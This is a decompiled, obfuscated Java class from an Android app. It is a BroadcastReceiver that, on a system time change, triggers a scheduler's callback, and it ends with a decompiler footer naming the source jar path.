package com.vvt.temporalcontrol.normal;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import com.vvt.temporalcontrol.c;

class b
  extends BroadcastReceiver
{
  b(NormalTaskScheduler paramNormalTaskScheduler) {}
  
  public void onReceive(Context paramContext, Intent paramIntent)
  {
    Object localObject = paramIntent.getAction();
    String str = "android.intent.action.TIME_SET";
    boolean bool = ((String)localObject).equals(str);
    if (bool)
    {
      bool = NormalTaskScheduler.e();
      if (bool) {}
      localObject = NormalTaskScheduler.e(this.a);
      if (localObject != null)
      {
        localObject = NormalTaskScheduler.e(this.a);
        ((c)localObject).a();
      }
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/temporalcontrol/normal/removeFromPath.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */